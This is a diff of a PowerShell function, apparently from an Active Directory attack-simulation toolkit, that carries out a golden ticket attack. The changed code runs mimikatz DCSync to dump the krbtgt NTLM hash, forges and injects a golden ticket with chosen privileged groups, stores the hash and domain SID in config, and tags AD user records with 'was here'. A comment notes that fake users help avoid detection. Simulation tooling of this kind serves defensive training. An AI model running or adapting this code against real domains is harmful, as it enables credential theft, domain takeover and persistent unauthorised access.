@@ -55,7 +55,7 @@ Function Invoke-GoldenTicketAttack {
 
     $sPrefix = Get-Date -Format HHmmss
     $sSuffix = Get-Date -Format yyyyMMdd
-    $sFakeUser = "FU-$sSuffix.$sPrefix"
+    $ShadowUser = "FU-$sSuffix.$sPrefix"
     
     Write-AS2GoOutput -Type H1 -Message "`nSelect an (fake) account for the Golden Ticket attack, for "
     Write-AS2GoOutput -Type Bullet -Message "A fake user improves stealth because it is not tied to a known, monitored admin account, making attribution and unusual account activity harder to detect."
@@ -65,7 +65,7 @@ Function Invoke-GoldenTicketAttack {
     $message = "Enter your choice!"
     $Options = @(
         [pscustomobject] @{ Label = "&User Account"; Help = "Select an existing AD user account from domain/forest"; Value = "Real" },
-        [pscustomobject] @{ Label = "&Fake User"; Help = "Random Fake User account, $sFakeUser"; Value = "Fake" }
+        [pscustomobject] @{ Label = "&Fake User"; Help = "Random Fake User account, $ShadowUser"; Value = "Fake" }
     )
     $answer = Show-DecisionPrompt -Message $message  -Options $Options -Default 0 -Title $title
     
@@ -84,10 +84,10 @@ Function Invoke-GoldenTicketAttack {
             Write-AS2GoOutput -Type Info -Message "No user selected for the Golden Ticket demonstration."
             return
         }
-                $cn = Convert-FromDNToCN -DistinguishedName $dn
+        $cn = Convert-FromDNToCN -DistinguishedName $dn
         $server = Get-BestDomainController -domain $dn
         $realUser = Get-ADUser -Server $server -identity $dn
-        $sFakeUser = $realUser.SamAccountName
+        $ShadowUser = $realUser.SamAccountName
         $dn = if ($dn -match '(?i)(^|,)(DC=[^,]+(?:,DC=[^,]+)*)$') { $Matches[2] } else { $null }
 
         Write-AS2GoOutput -Type Textmaker -message "Selected Account - " -TM $cn
@@ -96,6 +96,7 @@ Function Invoke-GoldenTicketAttack {
     $fqdn = Convert-FromDNToCN -DistinguishedName $dn
     $server = Get-BestDomainController -domain $dn
     $temp = $Script:AllDomainsDetails | Where-Object { $_.DomainDN -match "^$dn" } | Select-Object DomainFQDN, DomainSID, NetBIOSName, IsRootDomain 
+    
     $Script:ASDomainSID = $temp.DomainSID
     $Script:ASFQDN = $temp.DomainFQDN
     
@@ -105,24 +106,25 @@ Function Invoke-GoldenTicketAttack {
     $KrbtgtAccount = $temp.NetBIOSName + "\" + $KrbtgtName
  
 
-    Set-ASConfig -Setting "LastGTUser" -Value $sFakeUser
+    Set-ASConfig -Setting "LastGTUser" -Value $ShadowUser
 
-    Pause
 
     If (-not $SkipClearHost) { Clear-Host }
 
     Write-AS2GoOutput -Type  Header -M " Step 1 of 3 | Dump the NTLM Hash for the 'krbtgt' account"
     Write-AS2GoOutput -Type CodeSnippet -Message "Command:"
-    Write-Highlight -Text ".\mimikatz.exe ", """log .\", $sFakeUser, ".log", """ ""lsadump::", "dcsync", " /domain:", $Script:ASFQDN, " /user:", $KrbtgtAccount, """ ""exit"""   `
-        -Color $fgcC, $fgcS, $fgcV, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcS
-           
+      
+        
+    Write-Highlight -Text ".\mimikatz.exe ", """lsadump::", "dcsync", " /domain:", $Script:ASFQDN, " /user:", $KrbtgtAccount, """ ""exit"""   `
+        -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcS
+
     $answer = show-decisionPrompt
 
     If ($answer -eq $Script:Yes) {
-        Invoke-Command -ScriptBlock { & "$($Script:ASTools)\mimikatz.exe" "log $Script:DefautExfiltrationFolder\$sFakeUser.log" "lsadump::dcsync /domain:$Script:ASFQDN /dc:$server /user:$KrbtgtSID"  "exit" }
-        #Invoke-Item "$Script:DefautExfiltrationFolder\$sFakeUser.log"
+        Invoke-Command -ScriptBlock { & "$($Script:ASTools)\mimikatz.exe" "log $Script:DefautExfiltrationFolder\$ShadowUser.log" "lsadump::dcsync /domain:$Script:ASFQDN /dc:$server /user:$KrbtgtSID"  "exit" }
+        #Invoke-Item "$Script:DefautExfiltrationFolder\$ShadowUser.log"
         
-        [string]$result = get-content -path "$Script:DefautExfiltrationFolder\$sFakeUser.log" | Select-String 'Hash NTLM:'
+        [string]$result = get-content -path "$Script:DefautExfiltrationFolder\$ShadowUser.log" | Select-String 'Hash NTLM:'
 
         if (([string]::IsNullOrEmpty($result))  ) {
             Write-AS2GoOutput -type Error -Message  "Failed receiving NTLM Hash for $KrbtgtAccount account"
@@ -130,32 +132,17 @@ Function Invoke-GoldenTicketAttack {
         else {
             $hash = $result.Replace(" ", "").Split(":")[-1]
             Write-AS2GoOutput -type Success -Message "Identified NTLM Hash $hash for $KrbtgtAccount account"
-            set-ASConfig -Setting "krbtgtntml" -Value $hash
         }
         
         if ($UnAttended) { Start-Sleep 2 } else { Pause }
     }
 
     If (-not $SkipClearHost) { Clear-Host }
-    $Script:ASDomainSID = Get-ASConfig -Setting "DomainSID" 
-    $Script:ASSearchBase = Get-ASConfig -Setting "AS2GoSearchBase"
-    $Script:ASKrbtgtNtml = Get-ASConfig -Setting "krbtgtntml"
+    #$Script:ASDomainSID = Get-ASConfig -Setting "DomainSID" 
+    #$Script:ASSearchBase = Get-ASConfig -Setting "AS2GoSearchBase"
+    $Script:ASKrbtgtNtml = $hash
         
         
-    Do {
-        Write-AS2GoOutput -Type Header -Message "Step 2 of 3 | Forge a Golden Ticket"
-
-        $question = " -> Is this NTLH HASH '$Script:ASKrbtgtNtml'  for '$KrbtgtAccount'  correct - Y or N? Default "
-        $prompt = Get-Answer -question $question -defaultValue $Script:Yes
-    
-        if ($prompt -ne $Script:Yes) {
-            $Script:ASKrbtgtNtml = Read-Host "Enter new NTML Hash for '$KrbtgtAccount'"
-            Set-ASConfig -Setting "krbtgtntml" -Value $Script:ASKrbtgtNtml
-        }
-           
-    } Until ($prompt -eq $Script:Yes)
-
-
     If ($temp.IsRootDomain -eq $true) {
         $groups = "512,513,518,519"
     }
@@ -164,28 +151,30 @@ Function Invoke-GoldenTicketAttack {
     }
 
 
-    # example: .\mimikatz.exe "privilege::debug" "kerberos::purge" "kerberos::golden /domain:$Script:ASFQDN /sid:$Script:ASDomainSID /rc4:$Script:ASKrbtgtNtml /user:$sFakeUser /id:500 /groups:500, 501, 513, 512, 520, 518, 519 /ptt" "exit"
+    # example: .\mimikatz.exe "privilege::debug" "kerberos::purge" "kerberos::golden /domain:$Script:ASFQDN /sid:$Script:ASDomainSID /rc4:$Script:ASKrbtgtNtml /user:$ShadowUser /id:500 /groups:500, 501, 513, 512, 520, 518, 519 /ptt" "exit"
 
-    #    $sFakeUser = "Administrator"
+    #    $ShadowUser = "Administrator"
     Write-Host ""
     Write-Host      -NoNewline "  Command: "
-    Write-Highlight -Text ".\mimikatz.exe ", """privilege::debug"" ""kerberos::purge"" ""kerberos::", "golden", " /domain:", $Script:ASFQDN, " /sid:", $Script:ASDomainSID, " /rc4:", $Script:ASKrbtgtNtml, " /user:", $sFakeUser, " /id:", "6666666", " /groups:", $groups, " /ptt"" ""exit"""  `
+    Write-Highlight -Text ".\mimikatz.exe ", """privilege::debug"" ""kerberos::purge"" ""kerberos::", "golden", " /domain:", $Script:ASFQDN, " /sid:", $Script:ASDomainSID, " /rc4:", $Script:ASKrbtgtNtml, " /user:", $ShadowUser, " /id:", "6666666", " /groups:", $groups, " /ptt"" ""exit"""  `
         -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS
         
        
-    $question = "Would you like to run this step - Y or N? Default "
-    $answer = Get-Answer -question $question -defaultValue $Script:Yes
+    $answer = Show-DecisionPrompt
+    
         
     If ($answer -eq $Script:Yes) {
 
 
-        Invoke-Command -ScriptBlock { & "$($Script:ASTools)\mimikatz.exe" "log $Script:DefautExfiltrationFolder\$sFakeUser`GT.log" "privilege::debug" "kerberos::purge" "kerberos::golden /domain:$Script:ASFQDN /sid:$Script:ASDomainSID /rc4:$Script:ASKrbtgtNtml /user:$sFakeUser /id:6666666 /groups:$groups /ptt" "exit" }
+        set-ASConfig -Setting "ASP07KR" -Value "$($Script:ASFQDN)|$($ShadowUser)|$($Script:ASKrbtgtNtml)|$($groups)|$($Script:ASDomainSID)" -DPAPI
+
+        Invoke-Command -ScriptBlock { & "$($Script:ASTools)\mimikatz.exe" "log $Script:DefautExfiltrationFolder\$ShadowUser`GT.log" "privilege::debug" "kerberos::purge" "kerberos::golden /domain:$Script:ASFQDN /sid:$Script:ASDomainSID /rc4:$Script:ASKrbtgtNtml /user:$ShadowUser /id:6666666 /groups:$groups /ptt" "exit" }
 
              
-        [string]$result = get-content -path "$Script:DefautExfiltrationFolder\$sFakeUser`GT.log" | Select-String 'Golden ticket for'
+        [string]$result = get-content -path "$Script:DefautExfiltrationFolder\$ShadowUser`GT.log" | Select-String 'Golden ticket for'
 
         if (([string]::IsNullOrEmpty($result))  ) {
-            Write-AS2GoOutput -type Error -Message  "Failed to summit a Golden ticket for '$sFakeUser'."
+            Write-AS2GoOutput -type Error -Message  "Failed to summit a Golden ticket for '$ShadowUser'."
         }
         else {
             #Golden ticket for 'FU-20260520.144200 @ WS19-CHILD01.WS19-ROOT.CORP' successfully submitted for current session
@@ -228,7 +217,7 @@ Function Invoke-GoldenTicketAttack {
             Write-AS2GoOutput -Type Error -Message "Failed to access directory '\\$server\c$\*.*'."
         }
 
-        Get-ADUser -filter * -SearchBase $dn -server $server | Select-Object -first 10  | Set-ADUser -replace @{info = "Golden Ticket Attack - $sFakeUser was here" }
+        Get-ADUser -filter * -SearchBase $dn -server $server | Select-Object -first 10  | Set-ADUser -replace @{info = "Golden Ticket Attack - $ShadowUser was here" }
         get-ADUser -filter * -SearchBase $dn -server $server -Properties * | Select-Object sAMAccountName, whenChanged, Displayname, info | Select-Object -first 10 | Format-Table
 
 
@@ -242,7 +231,7 @@ Function Invoke-GoldenTicketAttack {
     foreach ($user in $users) {
         Set-ADUser -Identity $user.DistinguishedName `
             -Server $server `
-            -Replace @{ info = "Golden Ticket Attack - $sFakeUser was here" }
+            -Replace @{ info = "Golden Ticket Attack - $ShadowUser was here" }
     }
 
     Get-ADUser -Filter * -SearchBase $dn -Server $server -Properties info, whenChanged, DisplayName |
